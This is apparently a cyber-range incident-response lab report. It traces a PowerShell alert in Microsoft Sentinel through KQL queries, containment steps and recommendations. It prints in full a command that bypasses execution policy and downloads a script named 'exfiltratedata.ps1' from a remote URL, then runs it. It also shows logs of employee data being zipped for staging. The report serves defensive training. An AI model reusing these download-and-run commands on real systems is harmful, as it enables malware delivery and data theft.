# Incident Response Lab: Detect Web-Request from Powershell.exe

## Platforms and Tools Used
- Windows 10 Virtual Machines (Microsoft Azure)
- Microsoft Sentinel
- Endpoint Detection and Response (EDR): Microsoft Defender for Endpoint (MDE)
- Kusto Query Language (KQL)

---

## Detection and Analysis

### Initial Alert

The investigation began with an alert from Microsoft Sentinel for the rule "Detect Web-Request from Powershell.exe - PN". The alert triggered based on the following query:

```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

![_ir1](https://github.com/user-attachments/assets/0dc71ac4-95cb-4315-8ea2-36cbcc96caea)



This query detected the following suspicious command:
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
```

The command indicated that a PowerShell script (`exfiltratedata.ps1`) was downloaded from the internet to `C:\programdata`. This triggered further investigation.

### User Inquiry

I contacted the user of `ir-win10` to gather additional context. The user mentioned they attempted to install something, observed a black screen, and stated "nothing happened afterward." This information suggested the possibility of a malicious script being executed without their knowledge.

### Query 1: Process Events

To confirm whether the downloaded script was executed, I queried process events:
```kql
DeviceProcessEvents
| where DeviceName == "ir-win10"
| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
| project Timestamp, FileName, FolderPath, ProcessCommandLine
```
![_ir2](https://github.com/user-attachments/assets/8c377af9-291d-4c76-b71f-cf8ed5f9e37a)


**Findings:**
| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 18:48:38 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |

This confirmed the script was executed shortly after it was downloaded. 

### Query 2: Repeat Execution Detected

To investigate further, I re-ran the query to check for subsequent activity involving the same script. A second execution was detected:

![_ir3](https://github.com/user-attachments/assets/81af8306-52d5-4e37-ac87-e1066ea1958e)


| Timestamp          | FileName         | FolderPath                                  | ProcessCommandLine                                        |
|--------------------|------------------|--------------------------------------------|---------------------------------------------------------|
| 8 Jan 2025 19:48:27 | powershell.exe  | C:\Windows\System32\WindowsPowerShell\v1.0\ | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 |

This indicated ongoing malicious activity and elevated the incident to a live attack scenario.

### Query 3: Network Events

I analyzed network events to identify any potential data exfiltration:
```kql
DeviceNetworkEvents
| where DeviceName == "ir-win10"
| where InitiatingProcessCommandLine contains "exfiltratedata.ps1"
| project Timestamp, ActionType, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessCommandLine
| order by Timestamp
```
![_ir4](https://github.com/user-attachments/assets/1832d285-87de-4539-a3a4-a853e4018ab2)


**Findings:**
| Timestamp          | ActionType       | RemoteIP          | RemotePort | RemoteUrl                                      | CommandLine                                           |
|--------------------|------------------|-------------------|------------|------------------------------------------------|-----------------------------------------------------|
| 8 Jan 2025 18:48:35 | ConnectionSuccess | 185.199.109.133   | 443        | https://raw.githubusercontent.com              | powershell.exe -ExecutionPolicy Bypass -Command ... |
| 8 Jan 2025 18:48:39 | ConnectionSuccess | 20.60.181.193     | 443        | https://sacyberrange00.blob.core.windows.net    | powershell.exe -ExecutionPolicy Bypass -File ...    |
| 8 Jan 2025 19:48:47 | ConnectionSuccess | 20.60.133.132     | 443        | https://sacyberrangedanger.blob.core.windows.net| powershell.exe -ExecutionPolicy Bypass -File ...    |

The findings showed active connections to potentially malicious endpoints, further substantiating the threat.

### Query 4: File Events

To identify artifacts, I queried file events:
```kql
DeviceFileEvents
| where DeviceName == "ir-win10"
| where FileName endswith ".zip"
| project Timestamp, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
| order by Timestamp desc
```
![_ir5](https://github.com/user-attachments/assets/ef546c84-dab4-4d97-8680-02376498574f)


**Findings:**
| Timestamp          | FileName                     | FolderPath                             | InitiatingProcessCommandLine                                          | ActionType |
|--------------------|------------------------------|----------------------------------------|------------------------------------------------------------------------|------------|
| 8 Jan 2025 20:48:44 | employee-data-20250108074836.zip | C:\ProgramData\backup\employee-data-20250108074836.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
| 8 Jan 2025 19:48:41 | employee-data-20250108064831.zip | C:\ProgramData\backup\employee-data-20250108064831.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
| 8 Jan 2025 18:48:47 | employee-data-20250108054839.zip | C:\ProgramData\backup\employee-data-20250108054839.zip | powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1 | FileRenamed |
| 8 Jan 2025 20:48:43 | employee-data-20250108074836.zip | C:\ProgramData\employee-data-20250108074836.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108074836.zip C:\ProgramData\employee-data-temp20250108074836.csv" | FileCreated |
| 8 Jan 2025 19:48:40 | employee-data-20250108064831.zip | C:\ProgramData\employee-data-20250108064831.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108064831.zip C:\ProgramData\employee-data-temp20250108064831.csv" | FileCreated |
| 8 Jan 2025 18:48:47 | employee-data-20250108054839.zip | C:\ProgramData\employee-data-20250108054839.zip        | """7z.exe"" a C:\ProgramData\employee-data-20250108054839.zip C:\ProgramData\employee-data-temp20250108054839.csv" | FileCreated |

The repeated file creation and renaming strongly suggested data staging and preparation for exfiltration.

---

## Containment, Eradication, and Recovery

### Immediate Containment

1. **Quarantine Affected Device**:
   - Disconnected `ir-win10` from the network.

2. **Block Malicious IPs and URLs**:
   - Blocked the following IPs and domains in the firewall:
     - 185.199.109.133
     - 20.60.181.193
     - 20.60.133.132
     - https://raw.githubusercontent.com
     - https://sacyberrange00.blob.core.windows.net
     - https://sacyberrangedanger.blob.core.windows.net

### Investigation and Remediation

1. **Locate and Delete Malicious Artifacts**:
   - Removed all instances of `exfiltratedata.ps1` from `C:\programdata`.
   - Deleted any related ZIP files (e.g., `employee-data-*.zip`) and temporary files.

2. **Scan the System**:
   - Performed a full system scan using Microsoft Defender for Endpoint.
   - Used Windows Defender Offline for deeper inspection.

3. **Analyze Network Traffic**:
   - Inspected logs to confirm no sensitive data was exfiltrated.

4. **Harden Endpoint Security**:
   - Disabled PowerShell for non-administrative users.
   - Enforced stricter PowerShell execution policies.
   - Implemented application whitelisting to block unauthorized executables.

---

## Post-Incident Activities

### Recommendations

1. **Enhance Monitoring**:
   - Implement logging for PowerShell activities.
   - Create detection rules for unauthorized archiving tools and large file transfers.

2. **User Education**:
   - Train users to recognize suspicious activity.
   - Reinforce company policies against running untrusted scripts.

3. **Incident Documentation**:
   - Record all findings and actions taken.
   - Update incident response playbooks to include lessons learned.

### Post-Incident Monitoring

- Keep `ir-win10` under close monitoring post-remediation.
- Conduct network-wide scans to ensure no other devices were compromised.

---

## Closure

The incident was successfully contained, eradicated, and the affected device fully recovered. Documentation has been updated with findings, actions taken, and recommendations. Lessons learned have been incorporated into the organization’s incident response playbooks to improve future response capabilities.


